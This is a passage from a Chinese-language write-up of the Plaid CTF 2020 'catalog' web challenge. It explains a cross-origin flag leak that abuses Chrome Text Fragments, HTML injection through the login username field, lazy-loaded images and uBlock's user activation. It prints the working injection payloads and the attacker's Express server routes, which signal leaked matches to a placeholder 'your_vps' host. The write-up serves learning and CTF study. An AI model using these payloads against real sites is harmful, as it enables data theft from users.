&#x5B8C;&#x5168;&#x52A0;&#x8F7D;&#x5B8C;&#x6BD5;&#xFF0C;&#x6B64;&#x65F6; issue_1 &#x754C;&#x9762;&#x91CC;&#x9762;&#x8FD8;&#x6709;&#x4E00;&#x4E2A; img &#x6807;&#x7B7E;&#x7528;&#x4E8E;&#x89E3;&#x9501; status &#x9501;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://your_vps/fragment&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span>+<span class="hljs-attr">content</span>=<span class="hljs-string">&quot;0;URL=&apos;http://catalog.pwni.ng/issue.php?id=3#...&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6B64;&#x65F6;&#x4F1A;&#x8BF7;&#x6C42;&#x6211;&#x4EEC; <a href="http://your_vps/fragment" target="_blank" rel="noopener">http://your_vps/fragment</a> </p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">&quot;/fragment&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    status = <span class="hljs-literal">true</span>;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; Admin was fragmented&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">let</span> timer = setInterval(<span class="hljs-keyword">async</span> () =&gt; {</span><br><span class="line">        <span class="hljs-keyword">if</span> (unlock) {</span><br><span class="line">            res.send(<span class="hljs-string">&quot;fragment&quot;</span>);</span><br><span class="line">            clearInterval(timer);</span><br><span class="line">        }</span><br><span class="line">    }, <span class="hljs-number">1</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8BE5;&#x8DEF;&#x7531;&#x89E3;&#x9501;&#x4E86; status &#x9501;&#xFF0C;&#x5E76;&#x521B;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;&#x8BA1;&#x65F6;&#x5668;&#x7B49;&#x5F85; unlock &#x6765;&#x89E3;&#x9664;&#xFF0C;&#x6211;&#x4EEC;&#x79F0;&#x4E3A; fragment &#x9501;&#xFF0C;&#x8868;&#x793A; admin &#x5DF2;&#x7ECF;&#x52A0;&#x8F7D;&#x4E86; iframe &#x3002;</p></li><li><p>&#x8FD9;&#x662F;&#x56E0;&#x4E3A; fragment &#x9501;&#x7684;&#x539F;&#x56E0;&#xFF0C;iframe &#x5F53;&#x4E2D;&#x7684;&#x9875;&#x9762;&#x7B49;&#x5F85;&#x5728; issue_1 &#x754C;&#x9762;&#x7B49;&#x5F85; fragment &#x9501;&#x7684;&#x89E3;&#x9501;&#xFF0C;&#x800C;&#x5F53; status &#x9501;&#x89E3;&#x9501;&#xFF0C;&#x4F1A;&#x7ACB;&#x9A6C;&#x89E6;&#x53D1; index.html &#x5F53;&#x4E2D;&#x7684; fetch &#x8BF7;&#x6C42;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">await</span> fetch(<span class="hljs-string">&quot;http://catalog.pwni.ng/user.php&quot;</span>, {</span><br><span class="line">  <span class="hljs-string">&quot;headers&quot;</span>: {</span><br><span class="line">  <span class="hljs-string">&quot;content-type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">  },</span><br><span class="line">  <span class="hljs-string">&quot;body&quot;</span>: <span class="hljs-string">`username=&quot;/&gt;&lt;img src=&quot;http://your_vps/injection&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div align=&quot;left&quot;&gt;&lt;img src=&quot;http://your_vps/exfiltrated&quot; loading=&quot;lazy&quot;&gt;&lt;/div&gt;&lt;em&gt;&amp;password=1&amp;action=login`</span>,</span><br><span class="line">  <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;POST&quot;</span>,</span><br><span class="line">  <span class="hljs-string">&quot;mode&quot;</span>: <span class="hljs-string">&quot;no-cors&quot;</span>,</span><br><span class="line">  <span class="hljs-string">&quot;credentials&quot;</span>: <span class="hljs-string">&quot;include&quot;</span></span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x65F6;&#x56E0;&#x4E3A;&#x8FD8;&#x662F; admin &#x7684; session &#xFF0C;&#x6240;&#x4EE5; admin session &#x5B58;&#x50A8;&#x7684; HTML &#x5143;&#x7D20;&#x4F1A;&#x53D8;&#x6210;&#x6211;&#x4EEC;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684; HTML &#x5143;&#x7D20;</p></li><li><p>&#x63A5;&#x7740; index.html &#x6267;&#x884C;<code>await fetch(&quot;/unlock&quot;);</code>&#xFF0C;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">&quot;/unlock&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    unlock = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">&quot;unlock&quot;</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>unlock &#x8DEF;&#x7531;&#x5C06; unlock &#x7F6E;&#x4E3A; true&#xFF0C;&#x6E05;&#x9664;&#x4E86; fragment &#x8DEF;&#x7531;&#x5F53;&#x4E2D;&#x7684;&#x8BA1;&#x65F6;&#x5668;&#xFF0C;&#x89E3;&#x9501; fragment &#x9501;&#xFF0C;&#x6B64;&#x65F6; iframe &#x5F53;&#x4E2D;&#x7684; issue_1 &#x754C;&#x9762;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;&#x5168;&#x90E8;&#x52A0;&#x8F7D;&#xFF0C;&#x5E76;&#x56E0;&#x4E3A;<code>&lt;meta&gt;</code>&#x6807;&#x7B7E;&#x7684;&#x4F5C;&#x7528;&#x8DF3;&#x8F6C;&#x5230;&#x4E86;&#x5305;&#x542B;&#x6709; FLAG &#x5E76;&#x4E14;&#x6709; Text Fragemnt &#x529F;&#x80FD;&#x7684;&#x9875;&#x9762;</p></li><li><p>&#x6B64;&#x65F6; FLAG &#x9875;&#x9762;&#x8FD8;&#x662F; admin session &#x7684;&#x5173;&#x7CFB;&#xFF0C;&#x4F1A;&#x8BFB;&#x53D6;&#x4E0A;&#x4E00;&#x8F6E;&#x6211;&#x4EEC;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684; HTML &#x5143;&#x7D20;&#x4E5F;&#x5C31;&#x662F;&#x6CE8;&#x5165;&#x4E86;&#x5F88;&#x591A;<code>&lt;br&gt;</code>&#x6807;&#x7B7E;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x5B8C;&#x6210;&#x4E86;&#x5C06; FLAG &#x6324;&#x51FA;&#x7528;&#x6237;&#x89C6;&#x7A97;&#x754C;&#x9762;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x7531;&#x4E8E; uBlock &#x4F20;&#x9012;&#x4E86; User Activation &#x6FC0;&#x6D3B;&#x4E86; Text Fragment &#x529F;&#x80FD;&#xFF0C;&#x5C06;&#x4F1A;&#x5728;&#x9875;&#x9762;&#x8FDB;&#x884C;&#x5339;&#x914D; FLAG &#x5B57;&#x7B26;</p></li><li><p>&#x4E00;&#x52A0;&#x8F7D;&#x5B8C;&#x754C;&#x9762;&#x9996;&#x5148;&#x4F1A;&#x56E0;&#x4E3A;<code>&lt;img src=&quot;http://your_vps/injection&quot;&gt;</code>&#xFF0C;&#x8BF7;&#x6C42;&#x5230; injection &#x8DEF;&#x7531;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">&quot;/injection&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; HTML injection was inserted into id=3 catalog&quot;</span>);</span><br><span class="line">    setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {</span><br><span class="line">        <span class="hljs-keyword">if</span> (match) <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; There was a match&quot;</span>);</span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; There wasn&apos;t a match&quot;</span>);</span><br><span class="line">        match = <span class="hljs-literal">false</span>;</span><br><span class="line">        unlock = <span class="hljs-literal">false</span>;</span><br><span class="line">        status = <span class="hljs-literal">false</span>;</span><br><span class="line">    }, <span class="hljs-number">1000</span>);</span><br><span class="line">    res.send(<span class="hljs-string">&quot;injection&quot;</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6B64;&#x65F6;&#x4F1A;&#x6709;&#x4E00;&#x4E2A; 1s &#x5EF6;&#x65F6;&#x7B49;&#x5F85;&#xFF0C;&#x8FD9;&#x4E2A;&#x7B49;&#x5F85;&#x5C31;&#x662F;&#x4E3A;&#x4E86;&#x7B49;&#x5F85; Text Fragments &#x662F;&#x5426;&#x5339;&#x914D;&#x5230; FLAG&#x7684;&#x5224;&#x65AD;</p></li><li><p>&#x5982;&#x679C; Text Fragments &#x5339;&#x914D;&#x5230;&#x4E86;&#xFF0C;&#x5C31;&#x4F1A;&#x89E6;&#x53D1;&#x6EDA;&#x52A8;&#xFF0C;&#x7528;&#x6237;&#x89C6;&#x7A97;&#x6EDA;&#x52A8;&#x5230; FLAG &#x5904;&#xFF0C;&#x89E6;&#x53D1;&#x8BF7;&#x6C42;&#x61D2;&#x52A0;&#x8F7D;&#x7684;&#x56FE;&#x7247;<code>&lt;img src=&quot;http://your_vps/exfiltrated&quot; loading=&quot;lazy&quot;&gt;</code>&#xFF0C;&#x8BF7;&#x6C42;&#x5230; exfiltrated &#x8DEF;&#x7531;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">&quot;/exfiltrated&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    match = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">&quot;exfiltrated&quot;</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6B64;&#x65F6;&#x5C06; match &#x8BBE;&#x7F6E;&#x4E3A; true &#xFF0C;&#x8BA9; injection &#x5B8C;&#x6210;&#x6211;&#x4EEC;&#x7684;&#x5224;&#x65AD;&#x56DE;&#x663E;&#x3002;</p></li></ol><p>&#x6574;&#x4E2A;&#x653B;&#x51FB;&#x6D41;&#x7A0B;&#x5927;&#x81F4;&#x5C31;&#x8FD9;&#x6837;&#xFF0C;&#x56FE;&#x5C31;&#x61D2;&#x5F97;&#x753B;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x6574;&#x4E2A;&#x9898;&#x76EE;&#x4EE5;&#x53CA; wrtieup &#x8017;&#x8D39;&#x4E86;&#x6211;&#x4E0D;&#x5C11;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x6D89;&#x53CA;&#x5230;&#x7684;&#x6280;&#x672F;&#x90FD;&#x5206;&#x6790;&#x5B8C;&#x4E86;&#xFF0C;&#x5269;&#x4E0B;&#x5C31;&#x662F;&#x91CD;&#x590D; leak FLAG &#x4E86;&#x3002;&#xFF08;&#x95EE;&#x4E86;&#x4F5C;&#x8005;&#xFF0C;FLAG &#x4E00;&#x5171; 38 &#x4F4D;&#x2026;</p><h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><p>&#x8FD9;&#x91CC;&#x5199;&#x4E00;&#x70B9;&#x9898;&#x5916;&#x8BDD;</p><h3 id="postMessage"><a href="#postMessage" class="headerlink" title="postMessage"></a>postMessage</h3><p>&#x5173;&#x4E8E; uBlock &#x4F7F;&#x7528; <code>postMessage</code> &#x590D;&#x5236; User Activation &#x7684;&#x65B9;&#x6CD5;&#x6211;&#x4ECD;&#x7136;&#x8868;&#x793A;&#x5B58;&#x7591;&#xFF0C;&#x56E0;&#x4E3A;&#x81EA;&#x5DF1;&#x6839;&#x636E;&#x9605;&#x8BFB;&#x7684;&#x6587;&#x6863;&#xFF0C;<code>postMessage</code>&#x4F20;&#x9012; User Activation &#x9700;&#x8981;&#x6709;&#x5BF9;&#x5E94;&#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">window</span>.parent.postMessage(<span class="hljs-string">&apos;resize&apos;</span>, {<span class="hljs-attr">includeUserActivation</span>: <span class="hljs-literal">true</span>});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F46;&#x662F;&#x6211;&#x5E76;&#x6CA1;&#x6709;&#x5728; uBlock &#x770B;&#x5230;&#x76F8;&#x5173;&#x7684;&#x914D;&#x7F6E;&#xFF0C;<code>postMessage</code>&#x90FD;&#x662F;&#x4F7F;&#x7528;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF0C;&#x7136;&#x540E;&#x5173;&#x4E8E;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x6211;&#x4E5F;&#x67E5;&#x770B;&#x4E86;&#x90E8;&#x5206; Chromium &#x7684;&#x6E90;&#x7801;&#xFF0C;&#x5BF9;&#x4E8E; UserActivation &#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x662F; false &#x7684;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200425014346.png" alt></p><p>&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x901A;&#x8FC7; <a href="#Verification">Verification</a> &#x73AF;&#x8282;&#x6D4B;&#x8BD5;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x786E;&#x5B9E;&#x9700;&#x8981; uBlock &#x6765;&#x8FDB;&#x884C;&#xFF0C;&#x7531;&#x4E8E;&#x81EA;&#x5DF1;&#x65F6;&#x95F4;&#x5E76;&#x4E0D;&#x662F;&#x7279;&#x522B;&#x591A;&#xFF0C;&#x6700;&#x8FD1;&#x82B1;&#x592A;&#x591A;&#x65F6;&#x95F4;&#x5728;&#x8FD9;&#x9898;&#x7684;&#x590D;&#x76D8;&#x4E0A;&#xFF0C;&#x6240;&#x4EE5;&#x6700;&#x8FD1;&#x4E0D;&#x6253;&#x7B97;&#x518D;&#x6DF1;&#x7A76;&#x8FD9;&#x90E8;&#x5206;&#x7684;&#x5185;&#x5BB9;&#x4E86;&#xFF0C;&#x8FD9;&#x90E8;&#x5206;&#x7684;&#x5185;&#x5BB9;&#x4E0D;&#x4EC5;&#x6D89;&#x53CA;&#x5230; User Activation &#xFF0C;&#x8FD8;&#x6D89;&#x53CA;&#x5230;&#x4E00;&#x4E9B;&#x5173;&#x4E8E; User Activation &#x62BD;&#x8C61;&#x6A21;&#x578B;&#x7684;&#x4EE3;&#x7801;&#x5B9E;&#x73B0;&#xFF0C;&#x5982;&#x679C;&#x8981;&#x6DF1;&#x7A76;&#x7684;&#x8BDD;&#x5C31;&#x9700;&#x8981;&#x82B1;&#x6BD4;&#x8F83;&#x591A;&#x7684;&#x65F6;&#x95F4;&#x4E86;&#x3002;</p><h3 id="Verification"><a href="#Verification" class="headerlink" title="Verification"></a>Verification</h3><p>&#x81F3;&#x4E8E;&#x9A8C;&#x8BC1;&#x4E3A;&#x4EC0;&#x4E48;&#x4E00;&#x5B9A;&#x9700;&#x8981; uBlock &#x6765;&#x53C2;&#x4E0E;&#xFF0C;&#x8FD9;&#x90E8;&#x5206;&#x9A8C;&#x8BC1;&#x4E5F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x5C31;&#x662F;&#x81EA;&#x5DF1;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; issue &#xFF0C;&#x5185;&#x5BB9;&#x8BBE;&#x7F6E;&#x4E3A;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x6D4B;&#x8BD5;&#x7684; FLAG&#xFF0C;&#x6BD4;&#x5982; PCTF{TEST} &#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x8DDF; EXP &#x8FC7;&#x7A0B;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x628A; FLAG &#x7684;&#x5730;&#x5740;&#x6362;&#x4E3A;&#x81EA;&#x5DF1;&#x6D4B;&#x8BD5; FLAG &#x7684;&#x5730;&#x5740;&#x5373;&#x53EF;&#xFF0C;&#x7136;&#x540E;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<strong>&#x5173;&#x95ED; Chrome &#x62D3;&#x5C55; uBlock</strong> &#x6765;&#x6D4B;&#x4E00;&#x904D;&#xFF08;&#x6700;&#x597D;&#x662F;&#x4ECE; Chrome &#x62D3;&#x5C55;&#x5173;&#x95ED;&#xFF0C;&#x4F7F;&#x7528;&#x62D3;&#x5C55;&#x672C;&#x8EAB;&#x7684;&#x5173;&#x95ED;&#x5E76;&#x4E0D;&#x662F;&#x5168;&#x7AD9;&#x5173;&#x95ED;&#xFF09;&#xFF0C;&#x591A;&#x6D4B;&#x8BD5;&#x51E0;&#x6B21;&#x5C31;&#x4F1A;&#x53D1;&#x73B0;&#x786E;&#x5B9E;&#x9700;&#x8981;&#x5F15;&#x5165; uBlock &#x6765;&#x5B9E;&#x73B0; Leak Data &#x3002;</p><h3 id="Text-Fragment"><a href="#Text-Fragment" class="headerlink" title="Text Fragment"></a>Text Fragment</h3><p>&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x6BD4;&#x8F83;&#x53EF;&#x60DC;&#x7684;&#x662F; @wupco &#x5E08;&#x5085;&#xFF0C;&#x4ED6;&#x4E4B;&#x524D;&#x5173;&#x6CE8;&#x5230;&#x4E86;&#x8FD9;&#x4E2A; chrome Text Fragment &#x7684;&#x529F;&#x80FD;&#xFF0C;&#x5E76;&#x4E14;&#x4E5F;&#x5F15;&#x8D77;&#x4E86;&#x4ED6;&#x7684;&#x6CE8;&#x610F;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>#:~:text=flag{this_is_a_flag}</code>&#x7684;&#x5F62;&#x5F0F; leak data &#xFF0C;&#x53EF;&#x60DC;&#x4ED6;&#x8868;&#x793A;&#x6BD4;&#x8D5B;&#x7684;&#x65F6;&#x5019;&#x6CA1;&#x6709;&#x60F3;&#x8D77;&#x6765;&#x3002;&#xFF08;&#x4E0D;&#x6127;&#x662F;&#x8001; CTFer &#xFF0C;&#x4E00;&#x5F00;&#x53E3;&#x5C31;&#x77E5;&#x9053;&#x662F;&#x8001; CTFer &#x4E86;</p><blockquote><p>&#x200B;    How about using #:~:text=flag{this_is_a_flag} and onscroll to leak data?</p></blockquote><div class="twitter-wrapper"><blockquote class="twitter-tweet"><a href="https://twitter.com/wupco1996/status/1226938811147522060" target="_blank" rel="noopener"></a></blockquote></div><script async defer src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><h3 id="Other-Web-Challanges"><a href="#Other-Web-Challanges" class="headerlink" title="Other Web Challanges"></a>Other Web Challanges</h3><p>&#x8FD9;&#x6B21;&#x6BD4;&#x8D5B;&#x7684; Web &#x90FD;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#xFF0C;<a href="https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/">Contrived Web Problem</a> &#x662F;&#x4E00;&#x9053; FTP &#x5230; SSRF &#x7684;&#x5229;&#x7528;&#x94FE;&#xFF0C;wp &#x53EF;&#x4EE5;&#x770B;&#x6211;&#x7684;&#x535A;&#x5BA2;&#xFF0C;&#x4F46;&#x662F;&#x53EA;&#x6709;&#x82F1;&#x6587;&#x90E8;&#x5206;&#xFF0C;&#x5E76;&#x4E14;&#x6CA1;&#x6709;&#x5B8C;&#x6574;&#x7684; payload &#xFF0C;&#x53EA;&#x804A;&#x4E86;&#x804A;&#x5927;&#x81F4;&#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x800C;&#x4E14;&#x82F1;&#x6587;&#x6C34;&#x5E73;&#x53EF;&#x80FD;&#x6BD4;&#x8F83;&#x62D9;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;&#x4EE5;&#x540E;&#x81EA;&#x5DF1;&#x6709;&#x6CA1;&#x6709;&#x7A7A;&#x5199;&#x4E2D;&#x6587;&#x7684;&#xFF0C;&#x81EA;&#x5DF1;&#x4E5F;&#x4E0D;&#x592A;&#x786E;&#x5B9A;&#x3002; Mooz Chat &#x542C; @wupco &#x5E08;&#x5085;&#x8BF4;&#x662F;&#x4E00;&#x4E2A;&#x4E2D;&#x95F4;&#x4EBA;&#x52AB;&#x6301;&#x7684; web &#x9898;&#xFF0C;&#xFF08;&#x592A;&#x5F3A;&#x5927;&#x4E86;&#xFF0C;&#x9700;&#x8981;&#x9006;&#x5411;&#xFF0C;&#x8868;&#x793A;&#x5355;&#x51ED;&#x81EA;&#x5DF1;&#x5F04;&#x4E0D;&#x4E86;&#xFF09;&#xFF0C;&#x4F46;&#x662F;&#x4E2D;&#x95F4;&#x4EBA;&#x52AB;&#x6301;&#x7684;&#x9898;&#x76EE;&#x786E;&#x5B9E;&#x4EE4;&#x4EBA;&#x8033;&#x76EE;&#x4E00;&#x65B0;&#xFF01;&#x5982;&#x679C;&#x5E08;&#x5085;&#x4EEC;&#x6709;&#x76F8;&#x5173;&#x7684;&#x601D;&#x8DEF;&#x6216;&#x8005; wp &#x6B22;&#x8FCE;&#x4E00;&#x8D77;&#x4EA4;&#x6D41;&#xFF01;</p><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>&#x8FD9;&#x6B21;&#x6BD4;&#x8D5B;&#x7684;&#x9898;&#x4E2A;&#x4EBA;&#x89C9;&#x5F97;&#x8FD8;&#x662F;&#x6BD4;&#x8F83;&#x504F;&#x201C;&#x4FA7;&#x4FE1;&#x9053;&#x201D;&#x7684;&#xFF0C;&#x8FD9;&#x7C7B;&#x7684;&#x9898;&#x76EE;&#x6211;&#x90FD;&#x89C9;&#x5F97;&#x975E;&#x5E38;&#x597D;&#x73A9;&#xFF0C;&#x56E0;&#x4E3A;&#x4E0D;&#x540C;&#x4E8E;&#x4F20;&#x7EDF;&#x7684; Web &#x653B;&#x51FB;&#xFF0C;&#x8FD8;&#x901A;&#x5E38;&#x5F15;&#x5165;&#x4E86;&#x5F88;&#x591A;&#x6BD4;&#x8F83;&#x65B0;&#x7684;&#x7406;&#x5FF5;&#x4E0E;&#x653B;&#x51FB;&#x94FE;&#xFF0C;&#x867D;&#x7136; User Activation 